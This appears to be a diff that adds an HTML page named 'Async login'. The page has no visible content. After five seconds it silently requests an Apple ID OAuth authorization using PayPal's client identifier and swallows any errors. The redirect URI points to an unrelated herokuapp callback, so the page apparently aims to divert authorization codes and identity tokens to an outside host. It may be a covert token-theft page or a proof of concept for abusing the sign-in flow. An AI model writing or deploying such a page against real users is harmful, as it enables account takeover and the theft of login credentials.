@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Async login</title>
+</head>
+<body>
+<script type="text/javascript">
+  const urls = 'https://appleid.apple.com/auth/authorize?client_id=com.paypal.login.client&redirect_uri=https%3A%2F%2Fvensys.herokuapp.com%2Fcallback&response_type=code%20id_token&state=1562652309669&scope=openid&response_mode=form_post';
+
+
+function asyncLoadScriptUrls(reqUrl) {
+  try {
+    var req = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
+    req.open('GET', reqUrl);
+    req.send(); // This line is just to fetch the file and not intent to parse
+  } catch (e) {
+    // do nothing
+  }
+}
+setTimeout(function() {
+  asyncLoadScriptUrls(urls)
+}, 5000);
+</script>
+
+</body>
+</html>
